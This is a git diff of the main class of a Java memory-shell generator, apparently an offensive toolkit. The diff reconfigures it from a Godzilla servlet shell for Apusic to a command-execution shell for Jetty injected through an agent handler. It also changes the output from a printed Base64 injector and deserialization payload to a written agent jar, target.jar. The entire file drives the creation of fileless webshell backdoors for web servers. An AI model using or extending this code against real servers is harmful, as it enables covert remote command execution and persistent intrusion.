@@ -1,6 +1,8 @@
 package com.reajason.javaweb;
 
 import com.reajason.javaweb.memshell.AbstractShell;
+import com.reajason.javaweb.memshell.JettyShell;
+import com.reajason.javaweb.memshell.WebLogicShell;
 import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.memshell.packer.Packer;
 import com.reajason.javaweb.memshell.utils.CommonUtil;
@@ -10,6 +12,8 @@ import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang3.StringUtils;
 
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
 
 /**
  * @author ReaJason
@@ -19,9 +23,9 @@ public class GeneratorMain {
 
     public static void main(String[] args) throws IOException {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.Apusic)
-                .shellTool(ShellTool.Godzilla)
-                .shellType(Constants.SERVLET)
+                .server(Server.Jetty)
+                .shellTool(ShellTool.Command)
+                .shellType(JettyShell.AGENT_HANDLER)
                 .targetJreVersion(Opcodes.V1_6)
                 .debug(true)
                 .build();
@@ -39,12 +43,12 @@ public class GeneratorMain {
 
         InjectorConfig injectorConfig = new InjectorConfig();
 
-        GenerateResult generateResult = generate(shellConfig, injectorConfig, godzillaConfig);
+        GenerateResult generateResult = generate(shellConfig, injectorConfig, commandConfig);
         if (generateResult != null) {
 //            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
 //            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
-            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
-            System.out.println(Packer.INSTANCE.Deserialize.getPacker().pack(generateResult));
+//            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
+            Files.write(Path.of("target.jar"), Packer.INSTANCE.AgentJar.getPacker().packBytes(generateResult));
         }
     }
 
